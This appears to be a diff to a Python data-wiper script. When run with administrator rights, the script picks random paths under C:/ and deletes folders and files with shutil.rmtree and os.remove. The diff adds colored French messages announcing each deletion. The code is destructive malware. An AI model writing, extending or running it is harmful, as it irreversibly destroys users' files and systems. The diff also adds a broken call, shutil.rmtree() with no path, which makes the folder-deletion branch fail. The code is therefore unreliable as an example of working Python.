@@ -1,4 +1,5 @@
 import os, glob, random, pynput, ctypes, sys, shutil
+from colored import fg, attr, bg
 
 
 def is_admin():
@@ -30,7 +31,10 @@ if is_admin():
                     
                     rdprcnt = random.random()
                     if rdprcnt < pctodel: 
-                        try: shutil.rmtree(path.replace("\\", "/"))
+                        try: 
+                            path = path.replace("\\", "/")
+                            shutil.rmtree()
+                            print(f"{fg(1)}Dossier supprimé :{attr(1)} {fg(3)}{path}{attr(0)}")
                         except:
                             pctodel = 0
                             path = random.choice(glob.glob("C:/*"))
@@ -40,7 +44,10 @@ if is_admin():
                     pctodel += 0.1
                     
                 else:
-                    try: os.remove(path.replace("\\", "/"))
+                    try: 
+                        path = path.replace("\\", "/")
+                        os.remove(path)
+                        print(f"{fg(1)}Fichier supprimé :{attr(1)} {fg(4)}{path}{attr(0)}")
                     except:
                         pctodel = 0
                         path = random.choice(glob.glob("C:/*"))
